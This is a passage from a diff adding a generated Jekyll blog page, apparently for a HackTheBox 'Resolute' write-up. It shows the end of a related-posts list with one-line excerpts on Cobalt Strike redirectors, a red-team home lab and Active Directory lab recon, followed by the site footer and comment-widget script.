+        <time datetime="2024-12-19T00:00:00+05:30">December 19, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          4 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">This is how you setup single or multiple redirectors for Cobalt-Strike using malleable-c2 profiles and Apache SSL
+</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/sample/homelab/RTIL.jpg" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/red-team/RED-TEAM-Infra/" rel="permalink">RED-TEAM Home-Lab Infra
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-12-14T00:00:00+05:30">December 14, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          3 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">How to Setup a Red-Teams infrastructure at Home
+</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/sample/GOAD/goad-part3.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/goad/GOAD-p3/" rel="permalink">Game of Active Directory - Part 3 [Recon]
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-12-14T00:00:00+05:30">December 14, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          4 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">GOAD is a pentest active directory LAB project. The purpose of this lab is to give pentesters a vulnerable Active directory environment ready to use to pract...</p>
+  </article>
+</div>
+
+    
+  </div>
+</div>
+
+  
+  
+</div>
+
+      
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';" role="search">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+
+    
+      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2025 <a href="https://dcodezero.github.io/">https://dcodezero.github.io/</a>. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/jekyll-themes/minimal-mistakes/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+    
+  <script>
+    var disqus_config = function () {
+      this.page.url = "http://localhost:4000/hackthebox/Resolute/";  /* Replace PAGE_URL with your page's canonical URL variable */
+      this.page.identifier = "/hackthebox/Resolute"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */
+    };
+    (function() { /* DON'T EDIT BELOW THIS LINE */
+      var d = document, s = d.createElement('script');
+      s.src = 'https://dcode_zero.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+  
+
+
+
+
+  </body>
+</html>
